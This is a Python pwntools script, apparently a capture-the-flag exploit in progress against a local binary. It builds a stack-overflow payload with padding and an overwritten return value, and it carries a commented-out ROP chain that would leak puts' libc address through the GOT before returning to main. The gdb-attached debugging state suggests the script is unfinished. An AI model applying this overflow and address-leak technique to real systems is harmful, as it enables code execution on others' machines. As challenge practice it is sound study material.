#!/usr/bin/python
#coding=utf-8
#__author__:a
from pwn import *
import inspect
from sys import argv

def leak(var):
    callers_local_vars = inspect.currentframe().f_back.f_locals.items()
    temp =  [var_name for var_name, var_val in callers_local_vars if var_val is var][0]
    p.info(temp + ': {:#x}'.format(var))

s      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
r      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, b'\0'))
uu64    = lambda data               :u64(data.ljust(8, b'\0'))
plt     = lambda data               :elf.plt[data]
got     = lambda data               :elf.got[data]
sym     = lambda data               :libc.sym[data]
itr     = lambda                    :p.interactive()

local_libc  = '/home/cc/glibc-all-in-one/libs/2.32-0ubuntu3_amd64/libc-2.32.so'
local_libc_32 = '/lib/i386-linux-gnu/libc.so.6'
remote_libc = ''
binary = './main'
context.binary = binary
elf = ELF(binary,checksec=False)

p = process(binary)
if len(argv) > 1:
    if argv[1]=='r':
        p = remote('1',1)
elf=ELF(binary)
libc=ELF(local_libc)
# libc = elf.libc
# libc = ELF(remote_libc)

def dbg(cmd=''):
    # os.system('tmux set mouse on')
    context.terminal = ['tmux', 'splitw', '-h', '-p', '63', '-F' '#{pane_pid}', '-P']

    gdb.attach(proc.pidof(p)[0],cmd)
    pause()

plt_puts=elf.plt['puts']
got_puts=elf.got['puts']
start_addr=elf.symbols['_start']
print('start_addr',hex(start_addr))
print('plt_puts',hex(plt_puts))
print('got_puts',hex(got_puts))
pop_rdi_addr=0x0000000000401293
puts_addr=0x00000000004011C5
main_addr=0x0000000000401176
exp=b'a'*8*6
exp+=p64(0xffff254320000000)
# exp+=p64()
# exp+=p64(pop_rdi_addr)+p64(got_puts)+p64(puts_addr)+p64(main_addr)
# gdb.attach(p,'b *0x0000000000401225')
dbg('b *0x0000000000401225')
pause()
# p.sendline(exp)
# p.recvuntil(b'Now got was clear!\n')
# puts_addr=u64(p.recv(6).ljust(8,b'\x00'))
# print('puts_addr',hex(puts_addr))
# p.interactive()
# exp+=p64(start_addr)
p.sendline(exp)
p.interactive()
